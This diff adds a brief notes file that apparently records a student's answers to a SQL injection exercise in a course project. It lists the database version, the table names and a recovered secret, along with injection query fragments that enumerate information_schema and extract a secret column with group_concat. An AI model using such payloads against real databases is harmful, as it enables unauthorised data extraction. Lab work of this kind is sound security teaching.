@@ -1,0 +1,15 @@
+Name:proj2_xtra_cr3dit
+Version:5.5.44-0ubuntu0.14.04.1
+Tables: SECRETTABLE,foo,inject3_users
+Secret Message: hunter2
+
+information_schema.tables
+
+table_name from information_schema.tables where table_schema='proj2_xtra_cr3dit’;
+
+group_concat(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = “SECRETTABLE”;
+id,secret
+
+group_concat(secret) FROM SECRETTABLE;
+
+group_concat(id) FROM SECRETTABLE;
